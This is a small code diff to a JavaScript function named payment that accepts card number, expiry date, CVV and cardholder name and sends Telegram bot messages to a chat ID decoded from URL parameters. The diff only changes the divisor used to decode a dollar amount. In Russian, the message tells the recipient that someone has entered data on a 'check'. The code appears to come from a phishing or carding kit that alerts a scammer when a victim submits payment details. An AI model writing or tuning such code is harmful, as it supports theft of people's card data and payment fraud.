@@ -23,7 +23,7 @@ function payment(params, cardNumber, expiryDate, cvv, holder) {
         method: 'GET'
     })
 
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${parseInt(params.u)/4}&text=${encodeURIComponent(`🌐 IP: 000 💸 Произвёл ввод данных на чек в ${parseInt(params.a)/291}$`)}`, {
+    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${parseInt(params.u)/4}&text=${encodeURIComponent(`🌐 IP: 000 💸 Произвёл ввод данных на чек в ${parseInt(params.a)/271}$`)}`, {
         method: 'GET'
     })    
 
